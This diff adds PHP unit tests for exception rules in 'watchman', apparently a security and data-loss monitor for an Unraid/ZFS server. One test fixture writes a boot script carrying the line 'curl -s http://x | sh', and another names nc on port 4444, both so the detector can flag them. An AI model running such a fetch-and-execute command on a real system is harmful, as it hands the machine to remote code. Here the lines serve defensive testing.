+                                                                 'at' => 1, 'from' => 'hand', 'note' => ''] + ($opt !== null ? ['opt' => $opt] : []);
+    // $after: Serien's datasets after the round; $judge: settings and rules — the entry, the hits
+    $run = function (array $after, array $judge) use ($look, $zfs, $ds, $gb, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs(['tank/Serien' => $ds(1000 * $gb), 'tank/Filme' => $ds(100 * $gb)])]), $book, $t0);
+        [, $flow] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($after + ['tank/Filme' => $ds(100 * $gb)])]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_gone:share:Serien']['p'] ?? null, $judge['hits'] ?? [], $book];
+    };
+    $set = fn (array $data) => ['set' => watchmanSettings(['set' => ['data' => $data]])];
+    $lost = ['tank/Serien' => $ds(700 * $gb, 200 * $gb)];          // 300 GB gone, 200 GB of it still in snapshots
+    [$p0] = $run($lost, []);
+    same('6b gone: by default as up to 1.95 — 300 GB told, 200 GB of it still in snapshots', [300 * $gb, 200 * $gb, false], [$p0['bytes'] ?? null, $p0['kept'] ?? null, isset($p0['_must'])]);
+    [$p1] = $run($lost, $set(['kept' => false]));
+    same('6b gone: «what a snapshot holds counts as gone» off — 100 GB left, not over the clear: nothing', null, $p1);
+    $kept = $rule(['flow_gone'], ['share' => 'Serien'], ['kept' => false]);
+    [$p2, $h2] = $run($lost, ['rules' => [$kept]]);
+    same('6b gone: «in Serien, what a snapshot holds doesn\'t count» — nothing, the threshold\'s hit', [null, 1], [$p2, $h2[$kept['id']]['n'] ?? 0]);
+    [$p2b] = $run($lost, ['rules' => [$rule(['flow_gone'], ['share' => 'Filme'], ['kept' => false])]]);
+    same('6b gone: the same for Filme doesn\'t cover Serien — told', 300 * $gb, $p2b['bytes'] ?? null);
+    $min = $rule(['flow_gone'], ['share' => 'Serien'], ['min' => 400 * $gb]);
+    [$p3, $h3] = $run($lost, ['rules' => [$min]]);
+    same('6b gone: «Serien: from 400 GB an hour» — 300 GB nothing, a hit; at 250 GB it would be told anyway: 300 told, no hit',
+        [null, 1, 300 * $gb, []], [$p3, $h3[$min['id']]['n'] ?? 0, ...(fn ($r) => [$r[0]['bytes'] ?? null, $r[1]])($run($lost, ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 250 * $gb])]]))]);
+    same('6b gone: a threshold on writing doesn\'t touch deletions', 300 * $gb, $run($lost, ['rules' => [$rule(['flow_written'], ['share' => 'Serien'], ['min' => 900 * $gb])]])[0]['bytes'] ?? null);
+    // «always tell»: 700 of 1000 GB gone within the hour
+    $half = ['tank/Serien' => $ds(300 * $gb)];
+    [$p4, $h4] = $run($half, ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 900 * $gb])]]);
+    same('6b always tell: 70 % of Serien gone — told whatever the threshold (no hit), marked for the rules\' pass', [700 * $gb, true, []], [$p4['bytes'] ?? null, !empty($p4['_must']), $h4]);
+    [$p5] = $run($half, $set(['must' => false]) + ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 900 * $gb])]]);
+    same('6b always tell switched off: the threshold holds', null, $p5);
+    // the rules' pass: «don't judge deletions in Serien» lets the 300 GB through — never the 70 %
+    $pass = function (array $book, array $rules): array {
+        $b = [];
+        $st = [];
+        watchmanRulesApply($book, [], $b, [], ['rules' => $rules, 'off' => [], 'known' => []], [], $st, 2000000000);
+        return array_map(fn ($x) => [watchmanOpen($x), $x['by'] ?? null], array_values(array_filter($book, fn ($x) => str_starts_with((string) $x['key'], 'flow_gone:'))));
+    };
+    $let = $rule(['flow_gone'], ['share' => 'Serien']);
+    same('6b pass: «don\'t judge deletions in Serien» — 300 GB noted by the rule; 70 % still open', [[[false, 'rule']], [[true, null]]],
+        [$pass($run($lost, [])[2], [$let]), $pass($run($half, [])[2], [$let])]);
+    same('6b pass: a threshold never lets anything through in the pass', [[true, null]], $pass($run($lost, [])[2], [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 1])]));
+
+    // files: 21 000 deleted in Fotos while learning (clear 20 000) — a threshold of 30 000; 250 000 always told
+    $files = function (int $x, array $judge) use ($look, $zfs, $ds, $gb, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs(['tank/Fotos' => $ds(900 * $gb, 0, 100)])]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(['tank/Fotos' => $ds(900 * $gb, 0, 100 + $x)])]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_gone:files:share:Fotos']['p']['files'] ?? null, !empty($open['flow_gone:files:share:Fotos']['p']['_must']), $judge['hits'] ?? []];
+    };
+    $f30 = $rule(['flow_gone'], ['share' => 'Fotos'], ['files' => 30000]);
+    same('6b files: 21 000 told; with «Fotos: from 30 000 files» nothing (a hit); 250 000 always told',
+        [[21000, false, []], [null, false, 1], [250000, true, []]],
+        [$files(21000, []), (fn ($r) => [$r[0], $r[1], $r[2][$f30['id']]['n'] ?? 0])($files(21000, ['rules' => [$f30]])),
+         $files(250000, ['rules' => [$rule(['flow_gone'], ['share' => 'Fotos'], ['files' => 900000])]])]);
+    same('6b files: from 3000 an hour (his setting) while learned — the clear while learning stays 20 000', [null], [$files(15000, $set(['files_min' => 3000]))[0]]);
+
+    // written: new image layers left out of a share by its threshold
+    $wr = function (array $judge) use ($look, $gb, $t0): array {
+        $z = fn (array $sets) => ['datasets' => ['tank' => ['w' => 0, 'u' => 1, 's' => null, 'c' => 1]] + $sets, 'pools' => ['tank'], 'asleep' => []];
+        $bf = null;
+        $book = [];
+        $base = ['tank/system' => ['w' => 10 * $gb, 'u' => 20 * $gb, 's' => null, 'c' => 1]];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $z($base)]), $book, $t0);
+        $layer = ['tank/system/' . str_repeat('a', 64) => ['w' => 15 * $gb, 'u' => 15 * $gb, 's' => null, 'c' => $t0 + 100]];
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $z($base + $layer)]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_written:tank/system']['p']['bytes'] ?? null, $judge['hits'] ?? []];
+    };
+    $ly = $rule(['flow_written'], ['share' => 'system'], ['layers' => false]);
+    same('6b written: 15 GB of a new Docker layer into system told (as up to 1.95); with «new Docker images don\'t count» nothing, a hit',
+        [15 * $gb, null, 1], [$wr([])[0], $wr(['rules' => [$ly]])[0], $wr(['rules' => [$ly]])[1][$ly['id']]['n'] ?? 0]);
+
+    // a client: 60 GB in a round while learning (clear 50 GB); his setting 100 GB; a threshold for it
+    $cl = function (array $judge) use ($look, $gb, $t0): ?array {
+        $conn = fn (int $sent) => ['local' => '192.0.2.20', 'lport' => 445, 'peer' => '192.0.2.7', 'pport' => 50000, 'service' => 'smb', 'sent' => $sent, 'rcvd' => 0];
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['conns' => [$conn(1000)]]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn(1000 + 60 * $gb)]]), $book, $t0 + 300, $judge);
+        return array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_client:192.0.2.7|smb']['p'] ?? null;
+    };
+    same('6b pull: 60 GB told; «while learning 100 GB» nothing; «192.0.2.7: from 80 GB» nothing; a threshold for another computer — told',
+        [60 * $gb, null, null, 60 * $gb],
+        [$cl([])['bytes'] ?? null, $cl(['set' => watchmanSettings(['set' => ['pull' => ['new' => 100]]])]),
+         $cl(['rules' => [['id' => 'r0000000c1', 'cat' => 'pull', 'kinds' => ['flow_client'], 'on' => ['ip' => '192.0.2.7'], 'at' => 1, 'opt' => ['min' => 80 * $gb]]]]),
+         $cl(['rules' => [['id' => 'r0000000c2', 'cat' => 'pull', 'kinds' => ['flow_client'], 'on' => ['ip' => '192.0.2.8'], 'at' => 1, 'opt' => ['min' => 80 * $gb]]]])['bytes'] ?? null]);
+
+    // by hand
+    $made = fn (string $cat, string $type, string $v, int $n = 0) => (fn ($m) => [$m['kinds'], $m['on'], $m['opt'] ?? null])(watchmanRuleHandMake($cat, $type, $v, '', $n));
+    same('6b hand: a computer, from an amount; a container; a share\'s deletions, its writing, amounts, its snapshots, new images; a disk',
+        [[['flow_client'], ['ip' => '192.168.1.20'], null], [['flow_client'], ['ip' => '192.168.1.20'], ['min' => 30 * $gb]], [['flow_container'], ['key' => 'flow_container:plex'], null],
+         [['flow_gone'], ['share' => 'Downloads'], null], [['flow_written'], ['share' => 'domains'], null], [['flow_gone'], ['share' => 'Media'], ['min' => 200 * $gb]],
+         [['flow_gone'], ['share' => 'Media'], ['files' => 5000]], [['flow_gone'], ['share' => 'Media'], ['kept' => false]], [['flow_written'], ['share' => 'system'], ['layers' => false]],
+         [['flow_gone'], ['disk' => 'disk3'], null]],
+        [$made('pull', 'client', '192.168.1.20'), $made('pull', 'client_min', '192.168.1.20', 30), $made('pull', 'container', 'plex'), $made('data', 'gone', 'Downloads'),
+         $made('data', 'written', 'domains'), $made('data', 'gone_min', 'Media', 200), $made('data', 'files_min', 'Media', 5000), $made('data', 'kept', 'Media'),
+         $made('data', 'layers', 'system'), $made('data', 'disk_gone', 'disk3')]);
+    same('6b hand: an amount missing, a disk not a disk\'s name, a share with a slash — refused; the data\'s only with the clear yes',
+        ['watch_amount_bad', 'watch_value_bad', 'watch_value_bad', 'watch_rule_ask'],
+        [$err(fn () => watchmanRuleHandMake('data', 'gone_min', 'Media', '', 0)), $err(fn () => watchmanRuleHandMake('data', 'disk_gone', 'Disk 1', '')),
+         $err(fn () => watchmanRuleHandMake('data', 'gone', 'a/b', '')), $err(fn () => watchmanRuleHand('data', 'gone', 'Downloads', '', false, sys_get_temp_dir() . '/none', 1, false))]);
+}
+
+/**
+ * 1.96 step 6c — snapshots and offsite: the offsite setting (default = half, as before), a series thinned on a dataset or
+ * everywhere (never its last one), a dataset whose snapshots may go altogether (never a whole pool), a dataset whose holds
+ * may be released — each covers, each doesn't.
+ */
+function testWatchmanRules6c(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6c offsite: by default less than half left (as up to 1.95); 25 % and 75 % set', [true, false, false, true, true, false],
+        [watchmanKopiaEmptied(100, 49), watchmanKopiaEmptied(100, 50), watchmanKopiaEmptied(100, 30, 25), watchmanKopiaEmptied(100, 24, 25),
+         watchmanKopiaEmptied(100, 70, 75), watchmanKopiaEmptied(100, 75, 75)]);
+    same('6c offsite: the setting\'s default is half', 50, WATCH_SETTINGS['snap']['offsite']['def']);
+    $x = fn (string $ds, string $name, bool $left) => ['name' => $name, 'ds' => $ds, 'series' => watchmanSnapSeries($name), 'left' => $left, 'held' => false];
+    $r = fn (string $id, array $kinds, array $on) => ['id' => $id, 'cat' => 'snap', 'kinds' => $kinds, 'on' => $on, 'at' => 1];
+    $names = fn (array $list) => array_map(fn ($y) => $y['ds'] . '@' . $y['name'], $list);
+    $list = [$x('tank/Media', 'auto-20261101', true), $x('tank/Media', 'auto-20261102', false), $x('tank/Docs', 'auto-20261101', true), $x('tank/Docs', 'manual-1', true),
+             $x('tank/Media/sub', 'auto-20261101', true)];
+    $hits = [];
+    same('6c series everywhere: every thinned one of auto-# — never the last one (Media\'s newest), never another series',
+        ['tank/Media@auto-20261102', 'tank/Docs@manual-1'], $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s1', ['snap_gone'], ['series' => 'auto-#'])], $hits, 9)));
+    same('6c … its hits: one per snapshot it took', 3, $hits['r0000000s1']['n'] ?? 0);
+    same('6c series on a dataset: only on tank/Media (not Docs, not Media\'s child), not its last',
+        ['tank/Media@auto-20261102', 'tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'],
+        $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s2', ['snap_gone'], ['series' => 'auto-#', 'dataset' => 'tank/Media'])], $hits, 9)));
+    same('6c dataset: on tank/Media everything may go — its last one too; not its child, not Docs',
+        ['tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'],
+        $names(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media'])], $hits, 9)));
+    same('6c hold: a hold on tank/Media may be released — never a snapshot gone; and the gone rule never a hold',
+        [5, ['tank/Docs@auto-20261101', 'tank/Docs@manual-1', 'tank/Media/sub@auto-20261101'], 5],
+        [count(watchmanSnapRuled($list, 'snap_gone', [$r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $hits, 9)),
+         $names(watchmanSnapRuled($list, 'snap_hold_released', [$r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $hits, 9)),
+         count(watchmanSnapRuled($list, 'snap_hold_released', [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media'])], $hits, 9))]);
+    same('6c shapes: never a whole pool, a dataset below one', [null, null, ['dataset' => 'tank/Media'], ['series' => 'auto-#', 'dataset' => 'tank/Media']],
+        [watchmanRuleOn(['dataset' => 'tank']), watchmanRuleOn(['dataset' => 'tank/']), watchmanRuleOn(['dataset' => 'tank/Media']),
+         watchmanRuleOn(['series' => 'auto-#', 'dataset' => 'tank/Media'])]);
+    // in the compare: what the rules take out never makes an entry; what is left does
+    $bs = ['series' => []];
+    $book = [];
+    $h = [];
+    $res = ['gone' => [['fs' => 'zfs', 'where' => 'tank', 'list' => $list]], 'released' => [['fs' => 'zfs', 'where' => 'tank', 'list' => [$x('tank/Media', 'auto-20261101', true)]]]];
+    watchmanSnapCompare($bs, $res, $book, 9, [$r('r0000000s3', ['snap_gone'], ['dataset' => 'tank/Media']), $r('r0000000s4', ['snap_hold_released'], ['dataset' => 'tank/Media'])], $h);
+    same('6c compare: Media\'s two gone, its released hold — not in his book; Docs\' and the child\'s counted', [['snap_gone'], [3], [2, 1]],
+        [array_column($book, 'kind'), array_column($book, 'count'), [$h['r0000000s3']['n'] ?? 0, $h['r0000000s4']['n'] ?? 0]]);
+    // offers
+    $e = fn (string $kind, array $p) => watchmanEntry($kind, "$kind:zfs:tank", 1, ['where' => 'tank', 'fs' => 'zfs'] + $p);
+    same('6c offers: one series on one dataset — on it, or everywhere; two series — none; never the pool\'s key; a hold on one dataset',
+        [['series_ds', 'series'], ['series'], [], ['hold'], []],
+        [array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media', 'tank/Docs']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#', 'manual-#'], 'datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank/Media']]), []), 'type'),
+         array_column(watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank']]), []), 'type')]);
+    same('6c offers: asked more clearly (snap_gone, snap_hold_released are on the list)', [true, true],
+        [watchmanRuleOffers($e('snap_gone', ['series' => ['auto-#'], 'datasets' => ['tank/Media']]), [])[0]['ask'], watchmanRuleOffers($e('snap_hold_released', ['datasets' => ['tank/Media']]), [])[0]['ask']]);
+    // by hand
+    $made = fn (string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on'], $m['wide']])(watchmanRuleHandMake('snap', $type, $v, $second));
+    same('6c hand: a series, a series on a dataset, a dataset, a hold — each asked clearly',
+        [[['snap_gone'], ['series' => 'auto-#'], true], [['snap_gone'], ['series' => 'auto-#', 'dataset' => 'tank/Media'], true], [['snap_gone'], ['dataset' => 'tank/Media'], true],
+         [['snap_hold_released'], ['dataset' => 'tank/Media'], true]],
+        [$made('series', 'auto-#'), $made('series_ds', 'tank/Media', 'auto-#'), $made('dataset', 'tank/Media'), $made('hold', 'tank/Media')]);
+    same('6c hand: a whole pool refused, a snapshot name for a dataset refused, a series missing refused',
+        ['watch_pool_whole', 'watch_pool_whole', 'watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('snap', 'dataset', 'tank', '')), $err(fn () => watchmanRuleHandMake('snap', 'hold', 'tank', '')),
+         $err(fn () => watchmanRuleHandMake('snap', 'dataset', 'tank/Media@x', '')), $err(fn () => watchmanRuleHandMake('snap', 'series_ds', 'tank/Media', ''))]);
+}
+
+/**
+ * 1.96 step 6d — flash and accounts, open shares, the server itself, ways in: go's blanks and comments, guests reading,
+ * the exceptions (a file in /boot/extra, a share open to guests, a port, a program on any port, a tunnel's new peers) —
+ * each covers, each doesn't — the clearer question for --privileged, the Docker socket, memory, the flash; and the posture
+ * tips «public» and «privileged» leaving out what your exceptions call intended (none: as before, your note still holds).
+ */
+function testWatchmanRules6d(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6d settings: off by default (as up to 1.95)', [false, false], [WATCH_SETTINGS['flash']['go_blank']['def'], WATCH_SETTINGS['share']['secure_ok']['def']]);
+    $tmp = hardeningTmp('watch-6d');
+    $go = fn (string $text) => (file_put_contents("$tmp/go", $text) !== false ? watchmanFlash(['go' => "$tmp/go", 'extra' => "$tmp/none", 'passwd' => "$tmp/none",
+        'shadow' => "$tmp/none", 'ssh' => "$tmp/none"])['go'] : null);
+    $base = $go("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\n");
+    $cmp = function (array $kg, array $sg, bool $ok) {
+        $known = ['go' => $kg, 'extra' => [], 'users' => [], 'pw' => [], 'keys' => []];
+        $book = [];
+        watchmanFlashCompare($known, ['go' => $sg, 'extra' => [], 'users' => [], 'pw' => [], 'keys' => []], $book, 1, null, $ok);
+        return [array_column($book, 'kind'), $known['go']['hash'] === $sg['hash']];
+    };
+    $blank = $go("#!/bin/bash\n# Start the Management Utility (Unraid)\n\n/usr/local/sbin/emhttp &   \n");
+    $cmd = $go("#!/bin/bash\n# Start the Management Utility\n/usr/local/sbin/emhttp &\ncurl -s http://x | sh\n");
+    same('6d go: a comment and blanks only — told by default; with the setting normal; a command added — told; a baseline from before (no cmds) — told',
+        [[['flash_go'], false], [[], true], [['flash_go'], false], [['flash_go'], false]],
+        [$cmp($base, $blank, false), $cmp($base, $blank, true), $cmp($base, $cmd, true), $cmp(array_diff_key($base, ['cmds' => 1]), $blank, true)]);
+    hardeningRm($tmp);
+    $shares = function (array $seen, bool $ok) {
+        $known = ['Media' => ['smb' => 0, 'nfs' => 0, 'seen' => 1], 'flash' => ['smb' => 0, 'nfs' => 0, 'seen' => 1]];
+        $book = [];
+        watchmanSharesCompare($known, $seen, $book, 2, $ok);
+        return array_column($book, 'key');
+    };
+    same('6d shares: guests reading — told by default, normal with the setting; public — told; the flash for guests — always; a new share reading — normal',
+        [['share_public:Media:smb'], [], ['share_public:Media:smb'], ['share_public:flash:smb'], []],
+        [$shares(['Media' => ['smb' => 1, 'nfs' => 0]], false), $shares(['Media' => ['smb' => 1, 'nfs' => 0]], true), $shares(['Media' => ['smb' => 2, 'nfs' => 0]], true),
+         $shares(['flash' => ['smb' => 1, 'nfs' => 0]], true), $shares(['Docs' => ['smb' => 1, 'nfs' => 0]], true)]);
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    $sh = fn (string $share, string $proto, string $level) => $e('share_public', "share_public:$share:$proto", ['share' => $share, 'proto' => $proto, 'level' => $level]);
+    same('6d share open: reading covers reading only; writing covers both; another protocol or share no',
+        [true, false, true, true, false, false],
+        [$cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], $sh('Media', 'smb', 'secure')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], $sh('Media', 'smb', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'smb', 'secure')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'smb', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Media', 'nfs', 'public')),
+         $cov(['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'write'], $sh('Docs', 'smb', 'public'))]);
+    $ln = fn (string $prog, ?int $port) => $e('listen_new', 'listen_new:' . ($port === null ? "$prog:*" : "tcp:$port"), ['prog' => $prog, 'port' => $port, 'key' => $port === null ? "$prog:*" : "tcp:$port"]);
+    $wg = fn (?bool $opened, int $new) => $e('door_new', 'door_new:wg:wg0', ['key' => 'wg:wg0', 'door' => 'wireguard', 'new_peers' => $new] + ($opened === null ? [] : ['_opened' => $opened]));
+    same('6d prog: syncthing on any port yes, another program no; tunnel: new peers of wg0 yes — switched on, an entry from before 1.96, wg1 no',
+        [true, true, false, true, false, false, false],
+        [$cov(['listen_new'], ['prog' => 'syncthing'], $ln('syncthing', 8384)), $cov(['listen_new'], ['prog' => 'syncthing'], $ln('syncthing', null)),
+         $cov(['listen_new'], ['prog' => 'syncthing'], $ln('nc', 4444)),
+         $cov(['door_new'], ['tunnel' => 'wg0'], $wg(false, 2)), $cov(['door_new'], ['tunnel' => 'wg0'], $wg(true, 2)), $cov(['door_new'], ['tunnel' => 'wg0'], $wg(null, 2)),
+         $cov(['door_new'], ['tunnel' => 'wg1'], $wg(false, 2))]);
+    $offers = fn (array $x) => array_map(fn ($o) => [$o['type'], $o['ask']], watchmanRuleOffers($x, [$x]));
+    same('6d offers: a share open as it is now; the flash only its key, asked clearly; a program on any port; a tunnel\'s new peers',
+        [[['open', false]], [['key', true]], [['prog', false], ['key', false]], [['tunnel', true], ['key', true]], [['key', true]]],
+        [$offers($sh('Media', 'smb', 'public')), $offers($sh('flash', 'smb', 'secure')), $offers($ln('syncthing', 8384)), $offers($wg(false, 1)), $offers($wg(true, 1))]);
+    same('6d open offer: as the share is now — reading for ⟦Secure⟧, writing for ⟦Public⟧', ['read', 'write'],
+        [watchmanRuleOffers($sh('Media', 'smb', 'secure'), [])[0]['on']['open'], watchmanRuleOffers($sh('Media', 'smb', 'public'), [])[0]['on']['open']]);
+    same('6d asked clearly: --privileged, the Docker socket, the server\'s root, a program from memory on the server; not a device, not a container\'s /tmp',
+        [true, true, true, true, false, false],
+        [watchmanRuleOffers($e('container_privileged', 'container_privileged:x', ['name' => 'x', 'tokens' => ['--privileged']]), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['-v /var/run/docker.sock']]), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['-v /']]), [])[0]['ask'],
+         watchmanRuleOffers($e('proc_odd', 'proc_odd:host:/memfd:x', ['where' => 'host']), [])[0]['ask'],
+         watchmanRuleOffers($e('container_rights', 'container_rights:x', ['name' => 'x', 'tokens' => ['--device=/dev/dri']]), [])[0]['ask'],
+         watchmanRuleOffers($e('proc_odd', 'proc_odd:ct:x:/tmp/y', ['where' => 'x']), [])[0]['ask']]);
+
+    // the posture tips: what your exceptions call intended
+    $seen = ['shares' => ['Media' => ['smb' => 2, 'nfs' => 0], 'Docs' => ['smb' => 2, 'nfs' => 0]],
+             'containers' => ['vpn' => ['tokens' => ['--privileged'], 'start' => 'run'], 'dri' => ['tokens' => ['--privileged'], 'start' => 'auto']]];
+    $tips = fn (array $intended) => array_column(watchmanPosture([], $seen, [], $intended), null, 'id');
+    $none = $tips([]);
+    $some = $tips(watchmanPostureIntended([['kinds' => ['share_public'], 'on' => ['share' => 'Media', 'proto' => 'smb', 'open' => 'write']],
+                                           ['kinds' => ['container_privileged'], 'on' => ['key' => 'container_privileged:vpn']],
+                                           ['kinds' => ['share_public'], 'on' => ['share' => 'Docs', 'proto' => 'smb', 'open' => 'read']]]));
+    same('6d posture: nothing intended — exactly as up to 1.95 (the signature your note holds)', [watchmanHash('public|Media:SMB,Docs:SMB'), watchmanHash('privileged|vpn,dri')],
+        [$none['public']['sig'] ?? null, $none['privileged']['sig'] ?? null]);
+    same('6d posture: Media (writing) and vpn intended — the tips name the rest and call those intended; reading alone doesn\'t make ⟦Public⟧ intended',
+        ['Docs (SMB)', 'Media (SMB)', watchmanHash('public|Docs:SMB'), 'dri', 'vpn'],
+        [$some['public']['p']['names'] ?? null, $some['public']['p']['intended'] ?? null, $some['public']['sig'] ?? null, $some['privileged']['p']['names'] ?? null,
+         $some['privileged']['p']['intended'] ?? null]);
+    same('6d posture: all of them intended — no tip', [false, false],
+        (fn ($t) => [isset($t['public']), isset($t['privileged'])])($tips(['public' => ['Media:SMB' => true, 'Docs:SMB' => true], 'privileged' => ['vpn' => true, 'dri' => true]])));
+
+    // by hand
+    $made = fn (string $cat, string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on'], $m['wide']])(watchmanRuleHandMake($cat, $type, $v, $second));
+    same('6d hand: a file in /boot/extra, a share guests may read (SMB) or write (NFS, asked), a port, a program, a tunnel',
+        [[['flash_extra'], ['key' => 'flash_extra:x.txz'], false], [['share_public'], ['share' => 'Media', 'proto' => 'smb', 'open' => 'read'], false],
+         [['share_public'], ['share' => 'Media', 'proto' => 'nfs', 'open' => 'write'], true], [['listen_new'], ['key' => 'listen_new:tcp:8384'], false],
+         [['listen_new'], ['prog' => 'syncthing'], false], [['door_new'], ['tunnel' => 'wg0'], false]],
+        [$made('flash', 'extra', 'x.txz'), $made('share', 'guest_read', 'Media'), $made('share', 'guest_write', 'Media', 'NFS'), $made('host', 'port', '8384'),
+         $made('host', 'prog', 'syncthing'), $made('door', 'tunnel', 'wg0')]);
+    same('6d hand: the flash for guests, a port out of range, a protocol not SMB or NFS — refused', ['watch_value_bad', 'watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('share', 'guest_read', 'flash', '')), $err(fn () => watchmanRuleHandMake('host', 'port', '70000', '')),
+         $err(fn () => watchmanRuleHandMake('share', 'guest_read', 'Media', 'AFP'))]);
+}
+
+/**
+ * 1.96 step 6e — the partner door, the router, the network: settings (defaults = the constants), a partner from another
+ * address or net, an admin from a net, a VPN user from anywhere, a router's port, a sender not judged, a network whose new
+ * devices need no line, made-up Wi-Fi addresses — each covers, each doesn't; offers name only addresses the entry shows.
+ */
+function testWatchmanRules6e(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $set = watchmanSettings([]);
+    same('6e settings: the defaults are the constants he judged by', [WATCH_REFUSED_BURST, WATCH_REFUSED_WINDOW, WATCHNET_SILENT_FLOOR, WATCHNET_FLAPS,
+        WATCHNET_OUTAGE_SHORT, WATCHNET_OUTAGE_TELL, WATCHNET_CLOCK, false],
+        [$set['partner']['burst'], $set['partner']['window'], $set['router']['silent'] * 3600, $set['router']['flaps'], $set['router']['outage_short'] * 60,
+         $set['router']['outage_tell'] * 60, $set['router']['clock'] * 60, $set['lan']['random']]);
+    same('6e watchnet: his defaults hand watchnet exactly what it judged by', array_diff_key(watchnetSet([]), ['nets' => 1]), array_diff_key(watchmanNetSet($set, []), ['nets' => 1]));
+    $ns = ['senders' => ['192.168.1.1' => ['skew' => 400, 'meta' => ['host' => 'gw']]]];
+    $at = [watchnetClock($ns) !== null];
+    watchnetSet(watchmanNetSet(watchmanSettings(['set' => ['router' => ['clock' => 10]]]), []));
+    $at[] = watchnetClock($ns) !== null;
+    watchnetSet([]);
+    same('6e clock: 400 s off — advice by default, none with 10 min set', [true, false], $at);
+
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    $moved = fn (string $id, string $ip, string $how) => $e('door_key_moved', "door_key_moved:$id:$ip", ['id' => $id, 'name' => 'Tom', 'ip' => $ip, 'how' => $how]);
+    same('6e partner: its key from 192.168.7.9 yes, from the net yes; another key from there, another partner, another address no',
+        [true, true, false, false, false],
+        [$cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'net' => '192.168.7.0/24'], $moved('abcd1234', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.9', 'key')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('ffff0000', '192.168.7.9', 'address')),
+         $cov(['door_key_moved'], ['pair' => 'abcd1234', 'ip' => '192.168.7.9'], $moved('abcd1234', '192.168.7.10', 'address'))]);
+    $adm = fn (string $admin, string $ip) => $e('net_router_login', "net_router_login:gw:$admin:$ip", ['sender' => '192.168.1.1', 'admin' => $admin, 'ip' => $ip]);
+    $vpn = fn (string $user) => $e('net_vpn_login', "net_vpn_login:gw:$user:203.0.113.9", ['sender' => '192.168.1.1', 'user' => $user, 'ip' => '203.0.113.9']);
